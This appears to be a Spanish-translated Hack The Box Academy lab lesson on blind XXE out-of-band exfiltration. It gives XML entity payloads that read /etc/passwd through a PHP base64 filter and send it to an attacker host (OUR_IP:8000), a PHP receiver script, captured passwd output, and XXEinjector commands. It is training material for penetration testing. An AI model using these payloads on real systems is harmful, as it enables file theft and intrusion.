# Blind Data Exfiltration

En la sección anterior, vimos un ejemplo de una vulnerabilidad XXE ciega, donde no recibimos ninguna salida que contenga ninguna de nuestras entidades de entrada XML. Como el servidor web mostraba errores de tiempo de ejecución de PHP, podríamos usar este defecto para leer el contenido de los archivos de los errores mostrados. En esta sección, veremos cómo podemos obtener el contenido de los archivos en una situación completamente ciega, donde no obtenemos la salida de ninguna de las entidades XML ni obtenemos ningún error de PHP.

---

# **Exfiltración de datos fuera de banda**

Si intentamos repetir alguno de los métodos con el ejercicio que encontramos en`/blind`, Notaremos rápidamente que ninguno de ellos parece funcionar, ya que no tenemos forma de imprimir nada en la respuesta de la aplicación web. Para tales casos, podemos utilizar un método conocido como`Out-of-band (OOB) Data Exfiltration`, que a menudo se usa en casos ciegos similares con muchos ataques web, como inyecciones ciegas de SQL, inyecciones de comandos ciegos, XS ciegos y, por supuesto, XXE ciego. Ambos[Scripting de sitios cruzados (XSS)](https://academy.hackthebox.com/course/preview/cross-site-scripting-xss)y el[Whitebox Pentesting 101: Inyecciones de comando](https://academy.hackthebox.com/course/preview/whitebox-pentesting-101-command-injection)Los módulos discutieron ataques similares, y aquí utilizaremos un ataque similar, con ligeras modificaciones para adaptarse a nuestra vulnerabilidad XXE.

En nuestros ataques anteriores, utilizamos un`out-of-band`Ataque ya que alojamos el archivo DTD en nuestra máquina e hicimos que la aplicación web se conectara con nosotros (por lo tanto, fuera de banda). Entonces, nuestro ataque esta vez será bastante similar, con una diferencia significativa. En lugar de hacer que la aplicación web salga nuestro`file`Entidad a una entidad XML específica, haremos que la aplicación web envíe una solicitud web a nuestro servidor web con el contenido del archivo que estamos leyendo.

Para hacerlo, primero podemos usar una entidad de parámetros para el contenido del archivo que estamos leyendo mientras utilizamos el filtro PHP para codificarlo. Luego, crearemos otra entidad de parámetros externos y la referencia a nuestra IP, y colocaremos el`file`Valor de parámetros como parte de la URL que se solicita a través de HTTP, como sigue:

Código:xml

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">

```

Si, por ejemplo, el archivo que queremos leer tenía el contenido de`XXE_SAMPLE_DATA`, entonces el`file`El parámetro contendría sus datos codificados Base64 (`WFhFX1NBTVBMRV9EQVRB`). Cuando el XML intenta hacer referencia al externo`oob`parámetro de nuestra máquina, solicitará`http://OUR_IP:8000/?content=WFhFX1NBTVBMRV9EQVRB`. Finalmente, podemos decodificar el`WFhFX1NBTVBMRV9EQVRB`Cadena para obtener el contenido del archivo. Incluso podemos escribir un script PHP simple que detecte automáticamente el contenido del archivo codificado, lo decodifique y lo genera al terminal:

Código:php

```php
<?phpif(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```

Entonces, primero escribiremos el código PHP anterior para`index.php`y luego iniciar un servidor PHP en el puerto`8000`, como sigue:

Exfiltración de datos ciegos

```
xnoxos@htb[/htb]$ vi index.php # here we write the above PHP codexnoxos@htb[/htb]$ php -S 0.0.0.0:8000PHP 7.4.3 Development Server (http://0.0.0.0:8000) started

```

Ahora, para iniciar nuestro ataque, podemos usar una carga útil similar a la que usamos en el ataque basado en errores y simplemente agregar`<root>&content;</root>`, que se necesita para hacer referencia a nuestra entidad y hacer que envíe la solicitud a nuestra máquina con el contenido del archivo:

Código:xml

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```

Luego, podemos enviar nuestra solicitud a la aplicación web:

![](https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_blind_request.jpg)

Finalmente, podemos volver a nuestra terminal, y veremos que realmente obtuvimos la solicitud y su contenido decodificado:

Exfiltración de datos ciegos

```
PHP 7.4.3 Development Server (http://0.0.0.0:8000) started
10.10.14.16:46256 Accepted
10.10.14.16:46256 [200]: (null) /xxe.dtd
10.10.14.16:46256 Closing
10.10.14.16:46258 Accepted

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...SNIP...

```

**Consejo:**Además de almacenar nuestros datos codificados Base64 como un parámetro para nuestra URL, podemos utilizar`DNS OOB Exfiltration`colocando los datos codificados como un subdominio para nuestra URL (por ejemplo,`ENCODEDTEXT.our.website.com`), y luego usa una herramienta como`tcpdump`Para capturar cualquier tráfico entrante y decodificar la cadena del subdominio para obtener los datos. De acuerdo, este método es más avanzado y requiere más esfuerzo para exfiltrar los datos.

---

# **Exfiltración automatizada de OOB**

Aunque en algunos casos es posible que tengamos que usar el método manual que aprendimos anteriormente, en muchos otros casos, podemos automatizar el proceso de exfiltración de datos XXE ciegos con herramientas. Una de esas herramientas es[Xxeinector](https://github.com/enjoiz/XXEinjector). Esta herramienta admite la mayoría de los trucos que aprendimos en este módulo, incluidos XXE básicos, exfiltración de fuente CDATA, XXE basado en errores y OOB XXE ciegado.

Para usar esta herramienta para la exfiltración OOB automatizada, primero podemos clonar la herramienta a nuestra máquina, de la siguiente manera:

Exfiltración de datos ciegos

```
xnoxos@htb[/htb]$ git clone https://github.com/enjoiz/XXEinjector.gitCloning into 'XXEinjector'...
...SNIP...

```

Una vez que tenemos la herramienta, podemos copiar la solicitud HTTP de BURP y escribirla en un archivo para que la herramienta lo use. No debemos incluir los datos XML completos, solo la primera línea, y escribir`XXEINJECT`Después de él como localización de posición para la herramienta:

Código:http

```
POST /blind/submitDetails.php HTTP/1.1
Host: 10.129.201.94
Content-Length: 169
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://10.129.201.94
Referer: http://10.129.201.94/blind/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT

```

Ahora podemos ejecutar la herramienta con el`--host`/`--httpport`las banderas son nuestra IP y puerto, el`--file`Flager es el archivo que escribimos anteriormente, y el`--path`Flag es el archivo que queremos leer. También seleccionaremos el`--oob=http`y`--phpfilter`banderas para repetir el ataque OOB que hicimos arriba, de la siguiente manera:

Exfiltración de datos ciegos

```
xnoxos@htb[/htb]$ ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter...SNIP...
[+] Sending request with malicious XML.
[+] Responding with XML for: /etc/passwd
[+] Retrieved data:

```

Vemos que la herramienta no imprimió directamente los datos. Esto se debe a que estamos BASE64 codificando los datos, por lo que no se imprime. En cualquier caso, todos los archivos exfiltrados se almacenan en el`Logs`carpeta debajo de la herramienta, y podemos encontrar nuestro archivo allí:

Exfiltración de datos ciegos

```
xnoxos@htb[/htb]$ cat Logs/10.129.201.94/etc/passwd.log root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...SNIP..

```

Intente usar la herramienta para repetir otros métodos XXE que aprendimos.